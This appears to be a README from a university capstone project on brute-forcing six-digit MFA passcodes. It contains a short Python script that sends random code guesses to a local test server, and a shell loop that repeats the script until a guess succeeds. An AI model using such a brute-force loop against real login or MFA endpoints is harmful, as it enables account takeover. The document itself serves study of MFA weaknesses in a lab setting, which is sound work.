# MFAbruteforce
MSU Denver Capstone project. Brute forcing MFA six digit passcodes

#below is the code I used to generate numbers for MFA brute force. Michael Fincham's code found here https://git.sr.ht/~fincham/otpbrute, I had to simplify his code down for my use. 
#The code below was run in conjunction with code from Tim Goddard https://github.com/pruby/otp-brute-test
#!python3

import random	
import urllib.request

#always be 401 error unless correct guess, which is code 200
if True == True:
	Num = random.randint(100000,999999)
	print (Num)
	url = "http://127.0.0.1:3000/check?code="
	urlNum = Num
	urlAppend = str(url) + str(urlNum)
	print (urlAppend)
	with urllib.request.urlopen(urlAppend) as response:
		html=response.read()

#the script is what made the code above repeat as it could not do it on its own. 
#! /bin/sh

until python3 numberGenerator.py
do
	python3 numberGenerator.py
done
